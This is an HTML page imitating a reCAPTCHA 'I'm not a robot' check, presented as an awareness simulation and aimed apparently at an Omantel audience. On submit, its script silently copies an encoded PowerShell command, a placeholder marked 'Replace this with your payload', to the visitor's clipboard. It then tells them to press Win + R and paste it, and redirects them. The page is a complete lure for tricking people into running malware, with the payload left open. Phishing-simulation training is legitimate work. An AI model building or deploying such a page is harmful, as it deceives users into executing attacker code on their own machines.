<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification Awareness Simulation</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #fff;
      padding: 30px;
      border: 1px solid #ccc;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
      border-radius: 8px;
    }
    h2 {
      text-align: center;
      color: #444;
    }
    .field {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #555;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .captcha-box {
      display: flex;
      align-items: center;
      border: 1px solid #d3d3d3;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 15px;
    }
    .captcha-box img {
      margin-left: auto;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4285f4;
      border: none;
      color: #fff;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    .disclaimer {
      font-size: 12px;
      color: #888;
      text-align: center;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>reCAPTCHA Verification</h2>
    <form onsubmit="verify(); return false;">
      <div class="field">
        <label for="fname">First Name</label>
        <input type="text" id="fname" required>
      </div>
      <div class="field">
        <label for="lname">Last Name</label>
        <input type="text" id="lname" required>
      </div>
      <div class="field">
        <label for="email">Email</label>
        <input type="email" id="email" required>
      </div>
      <div class="captcha-box">
        <input type="checkbox" id="robotCheck" required>
        <label for="robotCheck">I'm not a robot</label>
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="24">
      </div>
      <button type="submit">Verify</button>
    </form>
    <p class="disclaimer">
      This is an awareness simulation page for training purposes only. No data is submitted or collected.
    </p>
  </div>

  <script>
    function verify() {
      var cmd = 'powershell.exe -e <INSERT_ENCODED_COMMAND>'; // Replace this with your payload

      // Try modern clipboard API
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(cmd).then(function () {
          alert("Verification complete. Please press Win + R and paste the command to continue.");
          setTimeout(() => {
            window.location.href = "https://www.omantel.om";
          }, 5000);
        }).catch(function () {
          fallbackCopy(cmd);
        });
      } else {
        fallbackCopy(cmd);
      }
    }

    function fallbackCopy(cmd) {
      try {
        var textarea = document.createElement('textarea');
        textarea.value = cmd;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      } catch (err) {
        console.error("Fallback copy failed:", err);
      }
      alert("Verification complete. Please press Win + R and paste the command to continue.");
      setTimeout(() => {
        window.location.href = "https://www.omantel.om";
      }, 5000);
    }
  </script>
</body>
</html>
